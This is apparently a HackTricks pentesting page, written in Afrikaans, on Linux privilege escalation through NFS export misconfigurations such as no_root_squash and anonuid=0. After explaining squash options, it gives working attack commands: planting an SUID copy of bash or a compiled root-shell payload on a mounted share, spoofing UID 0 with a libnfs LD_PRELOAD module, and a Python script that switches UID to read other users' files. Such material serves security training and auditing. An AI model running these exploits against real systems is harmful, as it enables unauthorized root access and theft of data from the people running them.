# Privilege-eskalasie weens NFS No Root Squash-wankonfigurasie

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting oor squashing

Met NFS AUTH_SYS/AUTH_UNIX baseer die bediener lêertoegangstoetsings op die `uid` en `gid` wat in elke RPC-versoek verskaf word. Ander sekuriteitsgeure, soos Kerberos, gebruik ander geloofsbriewe, en die bediener kan numeriese geloofsbriewe karteer voordat dit toestemmings nagaan.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Karteer elke UID en GID na die anonieme rekening, wat op Linux standaard `nobody` (65534) is. `no_all_squash` is die verstek vir nie-root-versoeke.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dit is die verstek op Linux en karteer versoeke met UID/GID 0 (root) na die anonieme rekening; ander UID's en GID's word nie gesquash nie.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Skakel root-squashing af, sodat versoeke met UID/GID 0 as root op die bediener geëvalueer kan word.<sup>[[4]](#references)</sup>

As ’n toegelate kliënt ’n skryfbare export in **`/etc/exports`** kan mount wat met **`no_root_squash`** opgestel is, kan sy UID/GID 0-versoeke daar as die bediener se root-gebruiker skryf.<sup>[[4]](#references)</sup>

`root_squash` karteer slegs UID/GID 0 oor; onder AUTH_SYS kan ’n toegelate kliënt se **nie-nul numeriese UID/GID** steeds ooreenstem met ’n ander rekening op die bediener. ’n Skryfbare export kan dus ’n pad tussen gebruikers word, selfs met root-squashing, as die kliënt ’n lêer as daardie numeriese identiteit kan skep en die bediener toegang toelaat. Verifieer vir ’n SUID/SGID-oordrag ook die eienaarskap van die resulterende lêer, uitvoertoegang, die bediener se `nosuid`-toestand, ACL's en SELinux of ander beleide. Die geëxporteerde padnaam, `rw`-opsie of ooreenstemmende nommer bewys op sigself nie dat die kliënt toegelaat word, die export aktief is, of dat die twee gashere dieselfde effektiewe identiteitskartering deel nie. Inspekteer `/etc/exports` en plaaslike metadata passief; moenie ’n nuwe share mount of ’n toetslêer tydens enumerasie skep nie.<sup>[[4]](#references)[[5]](#references)</sup>

Vir meer inligting oor **NFS**, kyk na:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege-eskalasie

### Anonieme kartering gelykstaande aan root

Moenie net vir `no_root_squash` kyk nie. Met `root_squash,anonuid=0,anongid=0` word ’n kliënt se UID/GID 0-versoek gesquash **terug na root**. Met `all_squash,anonuid=0,anongid=0` word selfs nie-root-kliëntidentiteite na root op die bediener gekarteer. Op ’n skryfbare `sec=sys`-export kan enige van hierdie konfigurasies die root-besitte lêerprimitief verskaf wat in die SUID-oordrag hieronder gebruik word; die beperkings op toegelate kliënte en die slagoffer se mount geld steeds.<sup>[[4]](#references)</sup>

Gebruik op die bediener `exportfs -v` om die aktiewe export en die opsies vir die **ooreenstemmende kliënt** te inspekteer, insluitend `rw`, `sec=`, die squash-modus en `anonuid`/`anongid`. Inspekteer ook `/etc/exports.d/*.exports` wanneer jy die konfigurasie nagaan; `/etc/exports` alleen kan onvolledig wees.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Opsie 1 met bash:
- Koppel op ’n toegelate kliënt ’n skryfbare export as root, kopieer **`/bin/bash`** daarheen, stel die **SUID**-bit in en voer dit uit vanaf ’n victim mount wat nie `nosuid` gebruik nie.<sup>[[2]](#references)[[4]](#references)</sup>
    - Om te verseker dat die opgelaaide lêer root as eienaar behou, moet die bediener kliënt-UID 0 behou met **`no_root_squash`** of die versoek na UID 0 karteer met **`anonuid=0`**. Andersins is ’n SUID-binary vir ’n ander rekening slegs moontlik as die kliënt dit met daardie rekening se numeriese UID/GID kan skep of besit.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opsie 2 met behulp van gecompileerde C-kode:
- Mount die gids vanaf ’n toegelate kliënt, kopieer ’n gecompileerde payload in wat SUID-toestemmings misbruik, stel sy **SUID**-bit, en voer dit vanaf die slagoffer uit (sien ’n paar [C SUID-payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Dieselfde beperkings as voorheen

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Let daarop dat as jy **’n tonnel van jou masjien na die slagoffermasjien kan skep, jy steeds die Remote-weergawe kan gebruik om hierdie privilege escalation uit te buit deur die vereiste poorte te tonnel**.\
> Die volgende truuk is nuttig wanneer `/etc/exports` die uitvoer tot die slagoffer se IP beperk: die afgeleë kliënt kan dit nie mount nie, maar die plaaslike tegniek kan deur die share werk wat reeds op die toegelate gasheer gemount is.<sup>[[2]](#references)</sup>\
> Vir hierdie unprivileged libnfs-metode moet die uitvoer in **`/etc/exports`** die `insecure`-vlag gebruik sodat die proses ’n nie-gereserveerde bronpoort kan gebruik; `secure` is die verstek, hoewel ’n proses wat ’n gereserveerde poort kan bind nie hierdie opsie nodig het nie.<sup>[[1]](#references)[[4]](#references)</sup>

### Basiese Inligting

’n NFSv3 AUTH_UNIX-kliënt sluit sy effektiewe UID, GID en groepe by elke oproep in, en die bediener gebruik dit vir toestemmingskontroles. Hierdie plaaslike tegniek misbruik daardie model deur die RPC-geloofsbriewe met [libnfs](https://github.com/sahlberg/libnfs) te vervals; die preload-module daarvan ondersteun die oorheersing van die UID/GID in die NFS-konteks.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Die biblioteek saamstel

Die libnfs-voorbeeld kan aanpassings vir die teikenkern vereis; die deurloop hier gebruik, meld spesifiek dat die fallocate-stelseloproepe uitgekommentarieer moet word voordat die preload-module saamgestel word.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Die exploit uitvoer

Die voorbeeld skep ’n klein C-helper wat ’n shell begin, plaas dit dan op die share en gebruik `ld_nfs.so` met UID 0 in die NFS-konteks om dit SUID-root te maak.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompileer die exploit-kode:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Plaas die exploit op die share en verander sy toestemmings deur die UID te vervals**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Voer die exploit uit om root-regte te verkry**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell vir Stealthy lêertoegang

Sodra root-toegang verkry is, stel hierdie `nfsh.py`-patroon die effektiewe UID op die teikenlêer se UID voordat ’n opdrag uitgevoer word, sodat toegang verkry kan word sonder om eienaarskap rekursief te verander.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Voer uit soos:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] ['n Verhaal van 'n minder bekende NFS-privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS-weergawe 3-protokolspesifikasie](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
